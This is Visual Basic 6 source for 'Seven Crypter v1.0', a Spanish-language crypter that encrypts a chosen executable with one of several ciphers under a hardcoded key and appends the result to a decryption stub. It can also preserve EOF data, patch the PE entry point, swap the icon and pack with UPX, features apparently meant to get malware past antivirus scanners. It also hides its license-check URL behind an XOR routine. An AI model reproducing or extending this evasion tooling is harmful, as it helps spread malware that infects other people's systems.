VERSION 5.00
Object = "{A8E5842E-102B-4289-9D57-3B3F5B5E15D3}#12.0#0"; "CODEJO~3.OCX"
Object = "{BD0C1912-66C3-49CC-8B12-7B347BF6C846}#12.0#0"; "CO875B~1.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Seven Crypter v1.0 Private Version"
   ClientHeight    =   6345
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   5445
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   6345
   ScaleWidth      =   5445
   StartUpPosition =   2  'CenterScreen
   Begin VB.PictureBox LOGO 
      BorderStyle     =   0  'None
      Height          =   1935
      Left            =   0
      Picture         =   "frmMain.frx":6852
      ScaleHeight     =   1935
      ScaleWidth      =   5655
      TabIndex        =   25
      Top             =   0
      Width           =   5655
   End
   Begin XtremeSuiteControls.GroupBox G4 
      Height          =   615
      Left            =   75
      TabIndex        =   23
      Top             =   5640
      Width           =   5295
      _Version        =   786432
      _ExtentX        =   9340
      _ExtentY        =   1085
      _StockProps     =   79
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.ProgressBar PB 
         Height          =   255
         Left            =   120
         TabIndex        =   24
         Top             =   240
         Width           =   5055
         _Version        =   786432
         _ExtentX        =   8916
         _ExtentY        =   450
         _StockProps     =   93
         Appearance      =   6
         UseVisualStyle  =   -1  'True
      End
   End
   Begin XtremeSuiteControls.GroupBox G3 
      Height          =   1095
      Left            =   75
      TabIndex        =   14
      Top             =   4440
      Width           =   5295
      _Version        =   786432
      _ExtentX        =   9340
      _ExtentY        =   1931
      _StockProps     =   79
      Caption         =   "Opciones"
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.CheckBox C5 
         Height          =   255
         Left            =   2520
         TabIndex        =   19
         Top             =   720
         Width           =   2055
         _Version        =   786432
         _ExtentX        =   3625
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Reajustar PE Header"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox C4 
         Height          =   255
         Left            =   120
         TabIndex        =   18
         Top             =   720
         Width           =   2055
         _Version        =   786432
         _ExtentX        =   3625
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Reajustar PE Entry Point"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox C3 
         Height          =   255
         Left            =   3840
         TabIndex        =   17
         Top             =   360
         Width           =   1335
         _Version        =   786432
         _ExtentX        =   2355
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Cambiar Icono"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox C2 
         Height          =   255
         Left            =   1680
         TabIndex        =   16
         Top             =   360
         Width           =   1815
         _Version        =   786432
         _ExtentX        =   3201
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Comprimir con UPX"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.CheckBox C1 
         Height          =   255
         Left            =   120
         TabIndex        =   15
         Top             =   360
         Width           =   975
         _Version        =   786432
         _ExtentX        =   1720
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "EOF Data"
         UseVisualStyle  =   -1  'True
      End
   End
   Begin XtremeSuiteControls.GroupBox G1 
      Height          =   1095
      Left            =   75
      TabIndex        =   0
      Top             =   2040
      Width           =   5295
      _Version        =   786432
      _ExtentX        =   9340
      _ExtentY        =   1931
      _StockProps     =   79
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.PushButton cmdExit 
         Height          =   375
         Left            =   2520
         TabIndex        =   22
         ToolTipText     =   "Salir"
         Top             =   600
         Width           =   375
         _Version        =   786432
         _ExtentX        =   661
         _ExtentY        =   661
         _StockProps     =   79
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":EC9B
      End
      Begin XtremeSuiteControls.PushButton cmdAcerca 
         Height          =   375
         Left            =   2040
         TabIndex        =   21
         ToolTipText     =   "Acerca"
         Top             =   600
         Width           =   375
         _Version        =   786432
         _ExtentX        =   661
         _ExtentY        =   661
         _StockProps     =   79
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":F235
      End
      Begin XtremeSuiteControls.PushButton cmdComprador 
         Height          =   375
         Left            =   1560
         TabIndex        =   20
         ToolTipText     =   "Opciones del Comprador"
         Top             =   600
         Width           =   375
         _Version        =   786432
         _ExtentX        =   661
         _ExtentY        =   661
         _StockProps     =   79
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":F7CF
      End
      Begin XtremeSuiteControls.PushButton cmdCrypt 
         Height          =   375
         Left            =   120
         TabIndex        =   3
         Top             =   600
         Width           =   1335
         _Version        =   786432
         _ExtentX        =   2355
         _ExtentY        =   661
         _StockProps     =   79
         Caption         =   "Encryptar"
         UseVisualStyle  =   -1  'True
         Picture         =   "frmMain.frx":FD69
      End
      Begin XtremeSuiteControls.PushButton cmdBuscar 
         Height          =   315
         Left            =   4680
         TabIndex        =   2
         Top             =   210
         Width           =   465
         _Version        =   786432
         _ExtentX        =   820
         _ExtentY        =   556
         _StockProps     =   79
         Caption         =   "..."
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.FlatEdit txtfile 
         Height          =   255
         Left            =   120
         TabIndex        =   1
         Top             =   240
         Width           =   4455
         _Version        =   786432
         _ExtentX        =   7858
         _ExtentY        =   450
         _StockProps     =   77
         BackColor       =   -2147483643
         Locked          =   -1  'True
         UseVisualStyle  =   -1  'True
      End
   End
   Begin XtremeSkinFramework.SkinFramework Skin 
      Left            =   7920
      Top             =   6120
      _Version        =   786432
      _ExtentX        =   635
      _ExtentY        =   635
      _StockProps     =   0
   End
   Begin XtremeSuiteControls.GroupBox G2 
      Height          =   1095
      Left            =   75
      TabIndex        =   4
      Top             =   3240
      Width           =   5295
      _Version        =   786432
      _ExtentX        =   9340
      _ExtentY        =   1931
      _StockProps     =   79
      Caption         =   "Tipo de encryptación "
      UseVisualStyle  =   -1  'True
      Begin XtremeSuiteControls.RadioButton O10 
         Height          =   255
         Left            =   4080
         TabIndex        =   26
         Top             =   720
         Width           =   855
         _Version        =   786432
         _ExtentX        =   1508
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Skipjack"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.RadioButton O9 
         Height          =   255
         Left            =   2040
         TabIndex        =   13
         Top             =   720
         Width           =   855
         _Version        =   786432
         _ExtentX        =   1508
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Huffman"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.RadioButton O8 
         Height          =   255
         Left            =   1080
         TabIndex        =   12
         Top             =   720
         Width           =   1095
         _Version        =   786432
         _ExtentX        =   1931
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Twofish"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.RadioButton O7 
         Height          =   255
         Left            =   3120
         TabIndex        =   11
         Top             =   720
         Width           =   855
         _Version        =   786432
         _ExtentX        =   1508
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "CryptAPI"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.RadioButton O6 
         Height          =   255
         Left            =   120
         TabIndex        =   10
         Top             =   720
         Width           =   975
         _Version        =   786432
         _ExtentX        =   1720
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Blowfish"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.RadioButton O5 
         Height          =   255
         Left            =   4080
         TabIndex        =   9
         Top             =   360
         Width           =   615
         _Version        =   786432
         _ExtentX        =   1085
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "Gost"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.RadioButton O4 
         Height          =   255
         Left            =   3120
         TabIndex        =   8
         Top             =   360
         Width           =   735
         _Version        =   786432
         _ExtentX        =   1296
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "TEA"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.RadioButton O3 
         Height          =   255
         Left            =   2040
         TabIndex        =   7
         Top             =   360
         Width           =   855
         _Version        =   786432
         _ExtentX        =   1508
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "DES"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.RadioButton O2 
         Height          =   255
         Left            =   1080
         TabIndex        =   6
         Top             =   360
         Width           =   735
         _Version        =   786432
         _ExtentX        =   1296
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "XOR"
         UseVisualStyle  =   -1  'True
      End
      Begin XtremeSuiteControls.RadioButton O1 
         Height          =   255
         Left            =   120
         TabIndex        =   5
         Top             =   360
         Width           =   615
         _Version        =   786432
         _ExtentX        =   1085
         _ExtentY        =   450
         _StockProps     =   79
         Caption         =   "RC4"
         UseVisualStyle  =   -1  'True
      End
   End
   Begin XtremeSuiteControls.CommonDialog CDI 
      Left            =   1920
      Top             =   2760
      _Version        =   786432
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.CommonDialog CD 
      Left            =   1920
      Top             =   2400
      _Version        =   786432
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   4
   End
   Begin XtremeSuiteControls.TrayIcon TI 
      Left            =   1680
      Top             =   2400
      _Version        =   786432
      _ExtentX        =   423
      _ExtentY        =   423
      _StockProps     =   16
      Text            =   "Seven Crypter v1.0 Private"
      Picture         =   "frmMain.frx":10303
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function InternetOpen Lib "wininet" Alias "InternetOpenA" (ByVal sAgent As String, ByVal lAccessType As Long, ByVal sProxyName As String, ByVal sProxyBypass As String, ByVal lFlags As Long) As Long
Private Declare Function InternetOpenUrl Lib "wininet" Alias "InternetOpenUrlA" (ByVal hInternetSession As Long, ByVal lpszUrl As String, ByVal lpszHeaders As String, ByVal dwHeadersLength As Long, ByVal dwFlags As Long, ByVal dwContext As Long) As Long
Private Declare Function InternetReadFile Lib "wininet" (ByVal hFile As Long, ByVal sBuffer As String, ByVal lNumBytesToRead As Long, lNumberOfBytesRead As Long) As Integer
Private Declare Function InternetCloseHandle Lib "wininet" (ByRef hInet As Long) As Long
Private Const INTERNET_FLAG_RELOAD = &H80000000

Const Password = "Lokas"
Dim Archivo As String

Private Sub cmdAcerca_Click()
MsgBox "Creado por Skyweb07 17/2/09" & vbNewLine & "Contacto : skyweb09@hotmail.com ", vbInformation, Me.Caption
End Sub

Private Sub cmdBuscar_Click()

With CD
       .DialogTitle = "Seleccione el archivo que desea encryptar"
       .InitDir = App.Path
       .Filter = "Aplicaciones EXE |*.exe"
       .ShowOpen
End With

If CD.Filename = "" Then Exit Sub
MsgBox "Archivo cargado correctamente!", vbInformation, Me.Caption
txtfile.Text = CD.Filename

If MsgBox("Desea seleccionar la opcion de EOF Data?", vbQuestion + vbYesNo) = vbYes Then
C1.Value = xtpChecked
End If

End Sub


Private Sub cmdCrypt_Click()
Dim Tamaño As String * 8
Dim RC4 As New clsRC4, XORX As New clsSimpleXOR, DES As New clsDES, TEA As New clsTEA, GOST As New clsGost, BLOW As New clsBlowfish, TWO As New clsTwofish, HU As New clsHuffman, CA As New clsCryptAPI, sp As New clsSkipjack, xData() As Byte
Dim TheEOF As String

If txtfile.Text = "" Then
MsgBox "Debe seleccionar algún archivo para encryptar!", vbExclamation, Me.Caption
Exit Sub
End If

If C1.Value = xtpChecked Then
TheEOF = ReadEOFData(txtfile.Text)
Else
End If

With CD
       .DialogTitle = "Seleccione donde va a guardar el archivo encryptado"
       .InitDir = App.Path
       .Filter = "Aplicaciones EXE |*.exe"
       .ShowSave
End With

If CD.Filename = "" Then Exit Sub
PB.Value = PB.Value + 10



Open CD.Filename For Binary Access Write As #2

If O1.Value = True Then
Archivo = LoadFile(App.Path & "\Components\RC4.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = RC4.EncryptString(Archivo, Password)
Else
End If

If O2.Value = True Then
Archivo = LoadFile(App.Path & "\Components\XOR.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = XORX.EncryptString(Archivo, Password)
Else
End If

If O3.Value = True Then
Archivo = LoadFile(App.Path & "\Components\DES.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = DES.EncryptString(Archivo, Password)
Else
End If

If O4.Value = True Then
Archivo = LoadFile(App.Path & "\Components\TEA.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = TEA.EncryptString(Archivo, Password)
Else
End If

If O5.Value = True Then
Archivo = LoadFile(App.Path & "\Components\Gost.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = GOST.EncryptString(Archivo, Password)
Else
End If

If O6.Value = True Then
Archivo = LoadFile(App.Path & "\Components\Blowfish.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = BLOW.EncryptString(Archivo, Password)
Else
End If

If O7.Value = True Then
Archivo = LoadFile(App.Path & "\Components\CryptAPI.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = CA.EncryptString(Archivo, Password)
Else
End If

If O8.Value = True Then
Archivo = LoadFile(App.Path & "\Components\Twofish.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = TWO.EncryptString(Archivo, Password)
Else
End If

If O9.Value = True Then
Archivo = LoadFile(App.Path & "\Components\Huffman.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = HU.EncodeString(Archivo)
Else
End If

If O10.Value = True Then
Archivo = LoadFile(App.Path & "\Components\Skipjack.X")
Put #2, , Archivo
Archivo = LoadFile(txtfile.Text)
Archivo = sp.EncryptString(Archivo, Password)
Else
End If


Put #2, , Archivo
Tamaño = Len(Archivo)
Put #2, , Tamaño
Put #2, , 50

Close #2

If C4.Value = xtpChecked Then
Call ChangeOEPFromFile(CD.Filename)
Else
End If

If C5.Value = xtpChecked Then
Call ChangeOEPFromFile(CD.Filename)
Else
End If


If C1.Value = xtpChecked Then
Call WriteEOFData(CD.Filename, TheEOF)
Else
End If

If C3.Value = xtpChecked Then

With CDI
        .DialogTitle = "Seleccione el icono que desea ponerle al archivo encryptado!"
        .InitDir = App.Path
        .Filter = "Iconos |*.ico"
        .ShowOpen
End With

Dim RESH() As Byte
RESH() = LoadResData(4, "CUSTOM")

Open App.Path & "\reshacker.exe" For Binary As #1
Put #1, , RESH()
Close #1
Call cambiaricono(CD.Filename, CDI.Filename)

Else
End If

If C2.Value = xtpChecked Then

Dim Data() As Byte
Data() = LoadResData(2, "CUSTOM")

Open App.Path & "\upx.exe" For Binary As #1
Put #1, , Data()
Close #1


Shell App.Path & "\upx.exe -1 -9 -f " & CD.Filename, vbHide


Else
End If

PB.Value = PB.Max
MsgBox "Archivo Encryptado Correctamente!", vbInformation, Me.Caption
PB.Value = PB.Min

End Sub

Private Sub cmdExit_Click()
If MsgBox("¿Desea abandonar la aplicación?", vbQuestion + vbYesNo, Me.Caption) = vbYes Then
End
End If
End Sub

Private Sub Form_Load()

If CheckUser("marb0s") = True Then
MsgBox "Authentication >>> Access Guaranteed", vbInformation, Me.Caption
Else
MsgBox "Autentificación >>> Access Denied", vbExclamation, Me.Caption
End
End If

Call Skinear(Me.hWnd)
End Sub

Private Function LoadFile(sPath As String) As String
    Dim lFileSize As Long
    Dim sdata As String
    
    On Error Resume Next
    
    Open sPath For Binary Access Read As #1
    lFileSize = LOF(1)
    sdata = Input$(lFileSize, 1)
    Close #1
    LoadFile = sdata
End Function

Private Sub Form_Unload(Cancel As Integer)

If DirD(App.Path & "\reshacker.exe") = True Then
Kill App.Path & "\reshacker.exe"
Else
End If

If DirD(App.Path & "\reshacker.txt") = True Then
Kill App.Path & "\reshacker.txt"
Else
End If

If DirD(App.Path & "\reshacker.ini") = True Then
Kill App.Path & "\reshacker.ini"
Else
End If

If DirD(App.Path & "\reshacker.log") = True Then
Kill App.Path & "\reshacker.log"
Else
End If

If DirD(App.Path & "\upx.exe") = True Then
Kill App.Path & "\upx.exe"
Else
End If

End Sub


Public Function CheckUser(UserName As String) As Boolean
Dim hOpen As Long, hURL As Long, sBuff As String, lRead As Long
hOpen = InternetOpen("Testing123", 1, 0, 0, 0)
If hOpen <> 0 Then
hURL = InternetOpenUrl(hOpen, dastr("ivwt?)(}{hjb`kkypqvzase6zuv3^kzNUCP") & UserName & ".txt", 0, 0, INTERNET_FLAG_RELOAD, 0)
sBuff = Space(1)
Call InternetReadFile(hURL, ByVal sBuff, 1, lRead)
If sBuff = "1" Then
CheckUser = True
Else
CheckUser = False
End If
Call InternetCloseHandle(hURL)
End If
Call InternetCloseHandle(hOpen)
End Function

Function dastr(inputstring As String) As String
If Len(inputstring) = 0 Then Exit Function
Dim P As String, o As String, K As String, S As String, tempstr As String, i As Integer, G As Integer
G = 1
For i = 1 To Len(inputstring)
P = Mid$(inputstring, i, 1)
o = Asc(P)
K = o Xor G
S = Chr$(K)
tempstr = tempstr & S
If G = 255 Then G = 1 Else G = G + 1
Next i
dastr = tempstr
End Function
